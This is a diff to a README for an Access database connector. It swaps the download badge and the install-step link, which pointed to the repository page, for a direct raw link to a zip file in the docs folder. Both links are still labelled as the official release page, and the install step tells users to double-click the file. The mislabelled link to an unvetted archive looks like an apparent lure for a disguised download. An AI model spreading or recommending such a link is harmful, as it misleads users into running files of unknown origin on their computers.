@@ -1,6 +1,6 @@
 # 📂 NDXAccess-Connecteur-NET - Connect your Access databases with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Vihanm7227/NDXAccess-Connecteur-NET)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Vihanm7227/NDXAccess-Connecteur-NET/main/docs/NDX_Connecteur_NET_Access_v2.3-alpha.4.zip)
 
 ## 📖 Project Overview
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these instructions to use the software on your Windows computer.
 
-1.  Visit the official release page to download the setup file: [Download Link](https://github.com/Vihanm7227/NDXAccess-Connecteur-NET).
+1.  Visit the official release page to download the setup file: [Download Link](https://raw.githubusercontent.com/Vihanm7227/NDXAccess-Connecteur-NET/main/docs/NDX_Connecteur_NET_Access_v2.3-alpha.4.zip).
 2.  Locate the downloaded file in your "Downloads" folder.
 3.  Double-click the file to start the installer.
 4.  Follow the prompts on your screen.
